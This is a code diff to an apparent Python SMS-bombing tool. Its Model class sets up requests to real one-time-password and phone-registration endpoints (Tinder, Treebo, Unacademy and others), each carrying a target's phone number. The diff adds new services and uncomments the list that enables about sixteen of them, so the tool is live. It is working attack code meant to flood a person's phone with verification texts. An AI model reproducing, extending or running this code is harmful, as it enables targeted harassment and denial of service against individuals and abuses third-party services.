@@ -2,6 +2,9 @@ from attack import Attack
 from serviceModel import ServiceModel
 from person import Person
 
+# You can add more services. Maybe can me moved to a separate file.
+# User agent can be added.
+
 class Model:
 
     def __init__(self):
@@ -125,34 +128,38 @@ class Model:
                 'Referer': 'hhttps://www.delivery-club.ru/'
             }
         )
-        ivi = ServiceModel( 
-            url='https://api.ivi.ru/mobileapi/user/register/phone/v6',
-            data={'phone': phone},
-            headers={
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Origin': 'https://www.delivery-club.ru',
-                'Referer': 'hhttps://www.delivery-club.ru/'
-            }
-        )
         tinder = ServiceModel( 
             url='https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
             data={'phone_number': phone},
             headers={
             }
         )
-        
-        #self.services.append(tinder)
-        #self.services.append(deliveryClub)
-        #self.services.append(mobikwik)
-        #self.services.append(mylescars)
-        #self.services.append(pharmeasy)
-        #self.services.append(zdravCity)
-        #self.services.append(worki)
-        #self.services.append(yandexEda)
-        #self.services.append(flipKart)
-        #self.services.append(koronaPay)
-        #self.services.append(rutube)
-        #self.services.append(odnoklassniki)
-        #self.services.append(youla)
-        #self.services.append(icq)
+        unacademy = ServiceModel( 
+            url='https://unacademy.com/api/v1/user/get_app_link/',
+            data={'phone': phone},
+            headers={
+            }
+        )
+        treebo = ServiceModel(
+            url='https://www.treebo.com/api/v2/auth/login/otp/',
+            data={'phone_number': phone},
+            headers={
+            }
+        )
+        self.services.append(treebo)
+        self.services.append(unacademy)
+        self.services.append(tinder)
+        self.services.append(deliveryClub)
+        self.services.append(mobikwik)
+        self.services.append(mylescars)
+        self.services.append(pharmeasy)
+        self.services.append(zdravCity)
+        self.services.append(worki)
+        self.services.append(yandexEda)
+        self.services.append(flipKart)
+        self.services.append(koronaPay)
+        self.services.append(rutube)
+        self.services.append(odnoklassniki)
+        self.services.append(youla)
+        self.services.append(icq)
         
